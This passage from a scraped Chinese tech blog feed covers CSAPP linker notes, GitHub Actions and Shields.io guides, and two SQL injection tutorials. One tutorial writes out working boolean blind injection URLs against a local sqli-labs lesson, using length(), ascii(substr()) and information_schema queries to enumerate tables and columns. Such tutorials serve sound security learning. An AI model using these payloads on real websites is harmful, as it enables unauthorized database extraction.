.bss 未初始化以及初始化为0的的全局和静态变量 不占据空间，仅是占位符 .symtab 符号表，包含在程序中定义和引用的函数和全局变量的信息 .rel.text 机器代码的重定位信息 .rel.data 被模块引用或定义的所有全局变量的重定位信息 符号和符号表链接过程的本质就是将不同的目标文件粘合在一起，而符号则可以看作是链接过程的粘合剂。 下图为ELF符号表的条目： 在使用readelf -s main.o命令查看main.o程序的符号表时，要注意section字段有3个特殊的伪节： 名称 含义 ABS 代表不被重定位的符号 UNDEF 代表未定义的符号，即在本目标模块中引用、在别处定义的符号 COMMON 表示还未被分配位置的未初始化的数据目标 注意：只有可重定位目标文件中才有这些伪节，可执行目标文件中没有。 COMMON和.bss的区别： COMMON: 未初始化的全局变量 .bss: 未初始化的静态变量，以及初始化为0的全局或静态变量 符号解析与静态库符号解析 链接器解析符号引用的方法是将每个引用与它的可重定位目标文件的符号表中的一个确定的符号定义关联起来。 换言之，一个符号至少要对应一个定义，无论两者是在同一模块还是不同模块。(每个模块中每个局部符号只有一个定义，全局符号引用解析的情况较为复杂，因为多个目标文件可能会定义相同名字的全局符号) 强符号：函数和已初始化的全局变量 弱符号：未初始化的全局变量 编译器解析多重定义的全局符号有以下三条规则： 不允许有多个同名的强符号 如果有一个强符号和多个弱符号同名，那么选择强符号 如果有多个弱符号同名，那么从这些弱符号中任意选择一个 规则2和规则3常常引发一些不易察觉的错误。为了避免此类错误，可以在编译时添加-fno-common选项，该选项会使得链接器在 遇到多重定义的全局符号时触发一个错误；或者添加-Werror选项，该选项会把所有的警告变成错误。 静态库 所有的编译系统都提供一种机制，将所有相关的目标模块打包成为一个单独的文件，称为静态库。 静态库文件，又称存档(archive)文件。 将上图addvec.c和multvec.c构造成一个静态库： 12gcc -c addvec.c multvec.car rcs libvector.a addvec.o multvec.o 第一行代码得到两个目标文件addvec.o和multvec.o，再输入第二行代码就构造了一个名为libvector.a的静态库。下图程序可以调用这个静态库，其中vector.h定义了这个静态库libvector.a中的函数原型。 12gcc -c main2.cgcc -static -o prog2c main2.o ./libvector.a 上述代码将源文件main2.c编译为目标文件main2.o，然后链接目标文件main2.o和静态库文件libvector.a，创建了可执行文件prog2c。过程如下图所示： 由于链接器判定main2.o只引用了libvector.a中addvec.o的addvec符号，因此只复制addvec.o到可执行文件，而不复制multvec.o。 静态库的解析过程1gcc -static -o prog2c main2.o ./libvector.a 上一节中使用上式链接源文件和静态库，其中涉及到利用静态库解析符号引用。具体过程如下：链接器维护3个集合，分别为： E，输入的可重定位目标文件集合 U，引用了但是尚未定义的符号的集合 D，已定义的符号的集合 链接器从左到右扫描可重定位目标文件和存档（静态库）文件，因此首先输入可重定位目标文件main.o。main.o进入集合E；addvec和printf符号没有在main.o中被定义，因此进入集合U；剩余的进入集合D。 接着，继续扫描到存档文件libvector.a，存档文件不进入集合E。链接器尝试匹配U中未解析的符号和由存档文件成员定义的符号，链接器发现libvector.a的成员addvec.o中存在符号addvec的定义，因此将addvec.o加入集合E，并将addvec从集合U中删除，另外addvec.o中定义的其他符号，即addcnt会被加入到集合D中。对静态库中每个成员目标文件都会进行上述过程，此例中另一个成员multvec.o没有定义U中的符号，因此集合U和D不发生变化，链接器继续处理下一个输入的文件。 上面的代码实际上隐式执行了对静态库libc.a的链接，实际上会输入libc.a，执行上述过程后集合情况如下： 此时集合U为空，说明没有未定义的符号，链接器将合并和重定位E中的目标文件，构造可执行目标文件。若集合U非空，则说明有未定义的符号，链接器将输出一个错误并终止。 这个过程也解释了命令行输入文件的顺序的重要性，例如将main2.o与./libvector.a互换位置，由于输入libvector时集合U为空，因此addvec.o不会被加入集合E，因此最后集合U中会存在未定义符号addvec，从而导致错误。 重定位在上一节中链接器确定了一个集合E，即要合并的目标文件，接下来就需要进行重定位操作。重定位分为两步： 重定位节和符号定义 重定位节中的符号引用 重定位节和符号引用示意图如下： 这一步完成后，程序中每条指令和全局变量都有唯一的运行时内存地址了。 重定位节中的符号引用这一步依赖重定位条目，对于代码的重定位条目位于.rel.text，对于已初始化数据的重定位条目位于.rel.data。 上图展示了ELF重定位条目的结构体定义。其中type（重定位类型)有32种，需要知道的有两种： R_X86_64_PC32（PC相对地址，PC值通常是下一条指令在内存中的地址） R_X86_64_32（绝对地址） 关于重定位的计算，可以参考【CSAPP-深入理解计算机系统】7-6. 重定位_哔哩哔哩_bilibili 可执行目标文件 如图所示为典型的ELF可执行目标文件ELF可执行文件的连续的片被映射到连续的内存段，程序头部表描述了这种映射关系。 将程序从磁盘复制到内存的过程叫做加载。加载器运行时，创建内存映像，在程序头部表的引导下，加载器将可执行文件的片复制到代码段和数据段，然后加载器跳转到程序的入口点。 如图所示为Linux x86-64运行时的内存映像。 动态链接共享库 共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为动态链接，是由一个叫做动态链接器的程序来执行的。 构造共享库的方式与构造静态库的方式很相似，只需将构造静态库的代码修改为： 1gcc -shared -fpic -o libvector.so addvec.c multvec.c 动态链接共享库的过程如图所示： 此外，还可以从应用程序中加载和链接共享库。 dlopen函数加载和链接共享库filename dlsym函数返回输入符号的地址 如果没有其他共享库还在使用该共享库，dlclose函数就卸载该共享库 dlerror函数返回dlopen、dlsym或dlclose函数的错误信息。 *库打桩机制作用：截获对共享库函数的调用，用其他代码取代 编译时打桩 链接时打桩 运行时打桩","categories":[{"name":"阅读笔记","slug":"阅读笔记","permalink":"https://blog.beacox.space/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://blog.beacox.space/tags/CSAPP/"},{"name":"系统","slug":"系统","permalink":"https://blog.beacox.space/tags/%E7%B3%BB%E7%BB%9F/"}]},{"title":"SQL注入新手教程（三）——布尔盲注","slug":"sqli3","date":"2022-06-21T14:51:10.000Z","updated":"2022-06-21T14:51:10.000Z","comments":true,"path":"posts/sqli3/","link":"","permalink":"https://blog.beacox.space/posts/sqli3/","excerpt":"","text":"在上一期教程中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！ 布尔盲注原理之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。 判断数据库是否能被布尔盲注依然，我们首先打开PHPstudy面板，启动WAMP。在浏览器地址栏输入http://localhost/sqli/Less-8/?id=1进入Lesson8（按照你的端口号、目录名等修改）。猜测对应的后端SQL语句为： 1select * from table_name where id=1 此时页面显示如下： 有提示文字 接着我们尝试破坏查询，在地址栏输入 1http://localhost/sqli/Less-8/?id=1' 猜测对应的后端SQL语句为： 1select * from table_name where id=1' 发现页面显示如下： 无提示文字 观察上图我们可以发现，You are in...这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。 接着我们就继续判断我们传入的参数在后端是如何被封装的。在地址栏输入 1http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+ 发现那段文字You are in...（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。因此推翻之前的SQL语句猜测，此处后端SQL语句形如： 1select * from table_name where id='1' and 1=1 --+' 布尔盲注思路确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。 首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。 这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。 确定数据库中表的数量我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。 在地址栏输入 1http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+ 后端SQL语句形如： 1select * from table_name where id='1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+' 这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见上一章。结果，页面显示了提示文字。表明当前数据库至少有4张表。接着我们将地址栏中的字符改为 1http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+ 作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。结果发现页面并没有显示提示文字。由此，我们得到结论：当前数据库中有且仅有4张表。 确定表名的字符串长度我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。在地址栏输入 1http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+ 作用是判断第一张表表名的字符串长度是否大于5。结果页面显示提示文字，证明第一张表表名的字符串长度大于5。接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。 确定表名的每一个字符所对应的ASCII码值在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图： ASCII码对应表 我们这里以第四张表为例（问就是第四张表重要），在地址栏输入 1http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+ 其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将&gt; 96改为&lt; 123尝试一下，发现的确如此。 接着可以采用二分法来确定该字符的具体值。将&lt; 123改为&gt; 110发现页面显示提示文字，因此将111和122作为两个端点继续划分。将&gt; 110改为&lt; 117发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。 利用同样的方法，我们猜解得到第四张表的表名为users。同样地，我们也能够猜解出其他表名。 确定表中字段数与确定数据库中表数量的方法一致，只需将table_name替换为column_name，information_schema.tables替换为information_schema.columns，table_schema=database()替换为table_name='users'即可。如： 1http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+ 发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。 后续确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。 结语本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://blog.beacox.space/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://blog.beacox.space/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"利用GitHub Actions自动发布你的静态资源到npm","slug":"action-npm","date":"2022-06-11T01:51:23.000Z","updated":"2022-06-11T01:51:23.000Z","comments":true,"path":"posts/action-npm/","link":"","permalink":"https://blog.beacox.space/posts/action-npm/","excerpt":"苦于GitHub Page和Vercel的本地资源加载速度，我和Felix一直在寻找各种静态资源的公共CDN。然而这些资源并不能很好满足我们的需求，因此想到利用npm包在国内的镜像来作为我们所需静态资源的CDN。我们同时想将这些静态资源托管在GitHub并发布到npm，这样一来手动操作就效率极低。","text":"苦于GitHub Page和Vercel的本地资源加载速度，我和Felix一直在寻找各种静态资源的公共CDN。然而这些资源并不能很好满足我们的需求，因此想到利用npm包在国内的镜像来作为我们所需静态资源的CDN。我们同时想将这些静态资源托管在GitHub并发布到npm，这样一来手动操作就效率极低。懒，也就成了这篇文章的第一驱动力。 注册npm并生成tokennpm注册界面https://www.npmjs.com/signup 点击链接进入npm注册界面，注册一个账号。 按下图所示生成一个token，并记录下来： 点击头像，Access Tokens 点击Generate New Token 填一个备注，选择automation，点击generate 这里一定要选择Automation，否则之后执行Action需要进行验证。 GitHub仓库配置新建workflow新建一个GitHub仓库，配置自己任意选择即可。新建一个Action： 新建workflow 将以下代码复制到这个yml文件当中： /.github/workflows/npm-publish.yml123456789101112131415161718192021222324name: Publish to npmon: push:# 检测到有push则执行actionjobs: publish-to-npm: runs-on: ubuntu-latest steps: - name: Checkout release branch code uses: actions/checkout@v3 - name: Use Node.js uses: actions/setup-node@master with: node-version: ${{ matrix.node-version }} registry-url: https://registry.npmjs.org - name: Publish to NPM run: npm publish || true env: NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }} 点击start commit 配置npm的token Name填写NPM_TOKEN，Value填写你刚刚在npm获取的token 本地修改并push至GitHub仓库电脑环境要求：Nodejs，Git。如果没有的话还请自行搜索安装。在某一个目录下打开Git Bash，输入以下命令 123git clone git@github.com:[UserName]/[RepoName].git#或者git clone https://github.com/[UserName]/[RepoName].git UserName为你的用户名，RepoName为方才创建的仓库名。 完成这一步之后需要对仓库进行npm的初始化： 1npm init 参数名 参数值 package name 不能和npm已有包名重复，建议使用用户名-仓库名的方式避免重复 version 版本号，默认即可 description 对包的描述 entry point 默认即可 test command 默认即可 git repository 对应的Git仓库地址，默认 keywords 关键词，可留空 author 包的作者，可以写你的用户名 license 默认即可 输入完成后将为你生成package.json文件，输入yes后，在当前目录下可以看到。 接下来将你想要上传的文件复制到这个目录里来。在命令行输入： 12345678# 将当前目录下的所有更改添加到缓存git add .# 提交更改git commit -m \"描述\"# 更新package版本号npm version patch# 推送至github触发actiongit push 等待push完成后，可以在GitHub检查一下Action是否成功运行，如果成功运行，npm将会给你发邮件通知包的发布情况。 查看资源例如我创建的包名为bf-static，在相应的根目录下我创建了一个logo.png。我可以通过以下链接进行访问： 1234# unpkghttps://unpkg.com/bf-static/logo.png# eleme国内镜像https://npm.elemecdn.com/bf-static/logo.png 相应地改成你的包名、文件路径和文件名即可。","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://blog.beacox.space/tags/npm/"},{"name":"GitHub","slug":"GitHub","permalink":"https://blog.beacox.space/tags/GitHub/"},{"name":"Actions","slug":"Actions","permalink":"https://blog.beacox.space/tags/Actions/"}]},{"title":"Shields.io使用之添加自定义图标","slug":"shield","date":"2022-06-07T15:09:36.000Z","updated":"2022-06-07T15:09:36.000Z","comments":true,"path":"posts/shield/","link":"","permalink":"https://blog.beacox.space/posts/shield/","excerpt":"引言Shields.io是一个为我们提供自定义徽章的文章。","text":"引言Shields.io是一个为我们提供自定义徽章的文章。在GitHub的很多仓库我们都能见到像这样的徽章，它们绝大多数都使用Shields.io制作。但是我们在使用logo时，由于其logo库使用Simple Icons，所以只有国际知名的品牌logo能在上面找到。那么，当我们想要使用自己定义的logo时，就不能仅凭logo=xxx这样简单的代码实现了。 官网描述desc 查看官网我们得到这样的信息。发现Shields.io其实是允许我们插入自定义logo图片的，但是要求是高度大于等于14px且http的请求头不能超过8192字节。只要知道文件Base64编码的DataURL形式就可以了。 图片准备裁剪压缩图片使用png格式图片进行裁剪压缩，我直接用的在线工具： I❤IMGhttps://www.iloveimg.com/zh-cn/compress-image 建议将图片裁剪压缩到5k左右，这样能使http请求头尽量小。况且徽章小，图片文件小些没关系 获取图片Base64编码的DataURL形式推荐大佬做的工具 Base64在线解码编码https://base64.us/ 如下图，选择你的logo图片（png格式） 将这一串字符全选复制。 拼接至URL中格式为： 1https://img.shields.io/badge/左边文字-右边文字-右边颜色?logo=data:image/png;base64,刚刚复制的那串字符 比如我的页脚Copyright徽章，URL为 1https://img.shields.io/badge/Copyright%402022-Bowen%20Young-%23EF9421?logo=data:image/png;base64,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 效果为： 补充上文data:image/png;base64,…这种形式被称为Data URL Scheme。 Data URL Scheme的作用，一般就是将经过Base64编码的数据嵌入网页中，从而减少请求资源的链接数。 上面的Data URL Scheme中 base64, 后的字符就是经过base64编码后的数据，浏览器会对其解码并渲染该图片资源。","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"shields","slug":"shields","permalink":"https://blog.beacox.space/tags/shields/"}]},{"title":"GitHub个人资料页美化","slug":"githubBeautify","date":"2022-05-18T10:48:56.000Z","updated":"2022-05-18T10:48:56.000Z","comments":true,"path":"posts/githubBeautify/","link":"","permalink":"https://blog.beacox.space/posts/githubBeautify/","excerpt":"本文介绍如何美化GitHub个人资料页","text":"本文介绍如何美化GitHub个人资料页 前言 .heimu { color: #000; background-color: #000; } .heimu:hover { color: #fff; } GitHub GayHub相信大家应该是常逛啊。有的时候我们会看到，有些用户的主页比较与众不同。比如说这位老哥： rzashakeri 我看到这个的第一想法就是：哎哟不错哦，俺也整一个玩玩儿！毕竟GitHub的界面还是比较单调的，这样的资料页可以说是简约中不失格调。So，开整！ 创建仓库新建一个仓库和你的用户名一致的仓库，勾选Public和Add a README file。 自动生成资料页效果图： 点击链接跳转按照提示填写要展示的信息就可以，然后拉到最下面点击Generate README可以先点preview预览一下，有的资源可能会没有然后复制markdown内容到你仓库中的README.md当中去，保存，就可以在你的主页看到效果了 标题图片 来源：项目仓库 先上效果图： 食用方法介绍： 点击链接去生成标题图片（怎么生成就不介绍了，一看就懂） 将下载下来的图片重命名为header.png 把这张图片上传到仓库根目录点击upload files 然后把这张图片上传上去，拉到底部点commit changes 再回到README.md，在第一行写上这段代码&lt;p align=\"center\"&gt;&lt;img src=\"header.png\"&gt;&lt;/p&gt;并保存 GitHub信息 来源：项目仓库 效果图： 在你需要添加GitHub信息的地方添加以下代码 1&lt;p align=\"center\"&gt;&amp;nbsp;&lt;img align=\"center\" src=\"https://github-readme-stats.vercel.app/api?username=bowenyoung&amp;show_icons=true&amp;locale=en&amp;theme=blue-green\" alt=\"bowenyoung\" /&gt;&lt;/p&gt; 其中bowenyoung这个地方要换成你的用户名，当然你也可以查看该项目的README.md更改主题或其他参数 博客最新文章（需要RSS） 来源：项目仓库 先上效果图： 食用方法介绍： 进入刚刚创建的，和你用户名相同的仓库 在你的README.md中加入&lt;!-- BLOG-POST-LIST:START --&gt;&lt;!-- BLOG-POST-LIST:END --&gt;，这段代码的位置就是之后显示博客最新文章的位置 在你的仓库中添加一个名为.github的文件夹，在这个文件夹下添加一个名为workflows的文件夹，在这个文件夹下再添加一个名为blog-post-workflow.yml的文件。听起来很复杂，只要按照下图操作即可 点击Create new file 在这个框里输入.github/workflows/blog-post-workflow.yml 在文件里输入以下代码 1234567891011121314151617name: Latest blog post workflowon: schedule: # 自动运行workflow - cron: '0 * * * *' # 每到整点运行一次 workflow_dispatch: # 可以手动在仓库的action中运行workflowjobs: update-readme-with-blog: name: Update this repo's README with latest blog posts runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 - name: Pull in dev.to posts uses: gautamkrishnar/blog-post-workflow@master with: feed_list: \"https://bowenyoung.cf/atom.xml\" 注意把feed_list后面的网址改成你的RSS链接。 到这里，所有的配置就完成了。如果想手动运行一下看结果，按照下图方法操作： 如果有其他需求，可以在项目仓库的README.md查看其他参数 添加GitHub活动 来源：项目仓库 效果图： 在README.md中需要添加GitHub活动的位置写下&lt;!--START_SECTION:activity--&gt;在.github/workflows/目录下添加update-readme.yml文件（方法见上一节）复制以下代码进去： 1234567891011121314151617name: Update READMEon: schedule: - cron: '0 * * * *' workflow_dispatch:jobs: build: runs-on: ubuntu-latest name: Update this repo's README with recent activity steps: - uses: actions/checkout@v2 - uses: jamesgeorge007/github-activity-readme@master env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} 同样地，可以手动运行对应的workflow看看效果。 结语 参考 beautify-github-profile项目 喜欢倒腾的小伙伴可以在该项目的文档中寻找更多有趣的功能实现！","categories":[{"name":"前端","slug":"前端","permalink":"https://blog.beacox.space/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://blog.beacox.space/tags/GitHub/"}]},{"title":"SQL注入新手教程（二）——基于报错的注入","slug":"sqli2","date":"2022-05-09T08:24:00.000Z","updated":"2022-05-09T08:24:00.000Z","comments":true,"path":"posts/sqli2/","link":"","permalink":"https://blog.beacox.space/posts/sqli2/","excerpt":"基础知识在学习本期内容之前，先介绍本期用到的基础知识。","text":"基础知识在学习本期内容之前，先介绍本期用到的基础知识。 表 行：又称为记录或数据 列：一般称为字段 常用语句 select用法：select 字段1,字段2,字段3…… from 表名 （where 筛选条件）翻译一下就是如果满足某条件，从某表选择某字段展示出来（所有行） limit用法：加在上述语句后面，如limit 0,1。表示限制显示的行数第一个参数表示起始行（0开始计数），第二个参数表示显示的行数。这一句就代表显示第0行。limit 2,3就是显示第2行到第4行 order by用法：order by 字段名或字段序号比如一张表users有三个字段（列），分别是id,username,passwd，你可以用select username from users order by id或者 by 1来这些记录按照id排序。默认升序，要降序可以order by 1 desc。也就是加一个descending的缩写。 union（重要）用法：select 字段1,字段2,字段3 from 表1 union select 字段1,字段2,字段3 from 表2用来将两条查询语句的查询结果拼接起来显示。注意：两条语句查找的字段数要一致。可以想象两张表如果是有不同列数是不能拼接起来的。 常用字符 逻辑运算符and 与；or 或；not 非。 单行注释#或-- 加号，连接（在URL中等同于空格）+ 通配符 *通配符的作用是匹配所有结果集。比如select * from users就是将users整张表展示出来 %通配符的作用是替代0个或多个字符，用在like中相当于正则表达式里的*。比如select username from users where username like “a%min”。则可能匹配到username为amin,admin,aemin,addddddmin……这样的记录（如果有） _通配符的作用是替代1个字符，用在like中比如select username from users where username like “a_min”。则可能匹配到admin,aemin,afmin……这样的记录（如果有） 数据库指纹所谓数据库指纹，就是说我们可以根据报错信息来判断数据库类型 NO 报错 数据库类型 1 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”1” LIMIT 0,1′ at line 1 MySQL 2 ORA-00933: SQL command not properly ended Oracle 3 Microsoft SQL Native Client error ‘80040e14’ Unclosed quotation mark after the character string MSSQL GET和POST传参我们在上网的过程中，需要和服务器进行交互。比如我们在搜索引擎搜索一个词语，就是向服务器传递了一个参数。服务器通过这个参数从数据库中找到我们想要的内容，再展示给我们。这就是传参的基本原理了。 GET传参如果你比较细心，你或许会发现你在浏览网站时有的时候浏览器地址栏你的URL是以?xx=xx这样的方式结尾的，这其实就是GET传参。GET方式传参的最大特点就是请求传递的参数最终都会显式地拼接到URL后面。 POST传参这种方式的传参不会显示在地址栏中，相对来说比较安全。输入密码这类敏感信息时通常会使用POST传参。 想象我的博客有这样一个界面： 12username:password: 